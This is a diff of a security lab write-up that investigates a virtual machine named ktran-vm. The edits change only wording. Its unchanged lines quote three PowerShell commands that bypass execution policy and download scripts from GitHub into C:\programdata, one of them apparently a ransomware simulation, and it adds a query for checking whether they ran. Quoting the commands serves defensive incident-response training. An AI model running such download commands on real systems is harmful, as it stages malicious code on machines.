@@ -43,13 +43,13 @@ Further investigation reveals 3 suspicious entities and the `ktran-vm` virtual m
 
 ![incident visual](/images-sus/investigate.png)
 
-The entities involved are as follows.
+The suspicious entities involved are as follows.
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
 Each entity is using Powershell's `Invoke-WebRequest` command to download a script from an external site (Github).
 
- The following query will show us if the scripts were executed and if so how many times.
+ I use the query below to see if the scripts were executed and if so how many times.
  ```
 let TargetHostname = "ktran-vm"; // Replace with the name of your VM as it shows up in the logs
 let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
